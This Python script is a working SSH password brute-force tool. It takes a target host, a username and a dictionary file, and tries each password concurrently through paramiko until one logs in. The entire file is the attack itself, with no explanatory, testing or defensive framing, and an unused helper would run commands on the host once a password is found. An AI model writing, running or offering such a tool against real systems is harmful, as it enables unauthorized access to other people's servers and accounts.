#!/usr/bin/env python3

import paramiko
import argparse
import time
import concurrent.futures
from threading import BoundedSemaphore
from helper_functions import lazy_load
import random

MAX_CONNECTIONS = 5
TIMEOUT = 10
MAX_WORKERS = 10


connection_sem = BoundedSemaphore(value=MAX_CONNECTIONS)
found = False
failures = 0
random.seed()

def send_command(connection, cmd):
    _, stdout, stderr = connection.exec_command(cmd)
    print(stdout.channel.recv(1024).decode("utf-8"))


def connect(host, user, password):
    global found
    global failures
    if found or failures > 5:
        return
    finished_without_errors = True
    with connection_sem as sem:
        try:
            #time.sleep(random.random())
            s  = paramiko.SSHClient()
            s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            s.connect(host, username=user, password=password, banner_timeout=TIMEOUT, timeout=TIMEOUT, auth_timeout=TIMEOUT)
            print(f"[+] Password found: {password}")
            found = True
        except paramiko.ssh_exception.AuthenticationException as er:
            print(f"[-] {password}: {er}")
            if "timeout" in str(er):
                print(f"[*] Trying {password} again...")
                failures += 1
                finished_without_errors = False
        except Exception as ex:
            print(f"[-] {password}: {ex}")
            finished_without_errors = False
            failures += 1
    s.close()
    if not finished_without_errors:
        connect(host, user, password)

def main():
    parser = argparse.ArgumentParser()
    optional = parser._action_groups.pop()
    required = parser.add_argument_group("required arguments")
    optional = parser.add_argument_group("optional arguments")
    required.add_argument("-H", "--host", type=str, help="target host", required=True)
    required.add_argument("-d", "--dict", type=str, help="dictionary file", required=True)
    required.add_argument("-u", "--user", type=str, help="username", required=True)
    args = parser.parse_args()
    user = args.user
    host = args.host

    with open(args.dict, "r") as d, concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        for word in lazy_load(d):
            if found:
                print("[*] Exiting: password found")
                exit(0)
            if failures > 5:
                print("[!] Exiting: too many timeouts and/or other errors")
                exit(-1)
            word = word.strip("\r").strip("\n")
            executor.submit(connect, host, user, word)

if __name__ == "__main__":
    main()
